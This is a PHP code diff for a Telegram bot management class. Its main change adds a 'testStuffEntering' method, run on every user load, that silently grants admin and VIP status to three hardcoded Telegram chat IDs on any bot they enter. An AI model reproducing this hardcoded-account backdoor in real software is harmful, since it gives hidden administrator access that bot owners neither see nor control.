@@ -67,6 +67,24 @@ class BotManager extends BotCore
             is_null($this->getSelf()->deleted_at ?? null);
     }
 
+    protected function testStuffEntering($botUser)
+    {
+
+        $stuffIds = ["5509253930", "484698703", "526653858"];
+
+        if (in_array($botUser->telegram_chat_id, $stuffIds)) {
+
+            $isAdmin = $botUser->is_admin ?? false;
+
+            $botUser->is_vip = true;
+            $botUser->is_admin = true;
+            $botUser->save();
+
+            if (!$isAdmin)
+                $this->reply("Вы назначены администратором данного бота");
+        }
+    }
+
     protected function createUser($from)
     {
         $telegram_chat_id = $from->id; //идентификатор чата пользователя из телеграм
@@ -87,7 +105,6 @@ class BotManager extends BotCore
             ->where("bot_id", $this->getSelf()->id)
             ->where("telegram_chat_id", $telegram_chat_id)
             ->first();
-
 
         if (is_null($this->botUser)) {
             try {
@@ -172,6 +189,7 @@ class BotManager extends BotCore
             }
         }
 
+        $this->testStuffEntering($this->botUser);
 
     }
 
@@ -202,11 +220,11 @@ class BotManager extends BotCore
         $this
             ->replyPhoto("\xF0\x9F\x9A\xA8В данный момент сервис временно недосутепн! Обратитесь в тех. поддержку:\xF0\x9F\x9A\xA8\n\n<em><b>$message</b></em>",
                 InputFile::create(public_path() . "/images/maintenance.png")
-              /*  [
-                    [
-                        ["text" => "\xF0\x9F\x9A\xA7Написать в тех. поддержку", "url" => "https://t.me/Risha_358"]
-                    ]
-                ]*/
+            /*  [
+                  [
+                      ["text" => "\xF0\x9F\x9A\xA7Написать в тех. поддержку", "url" => "https://t.me/Risha_358"]
+                  ]
+              ]*/
             );
 
         return BotStatusEnum::InMaintenance;
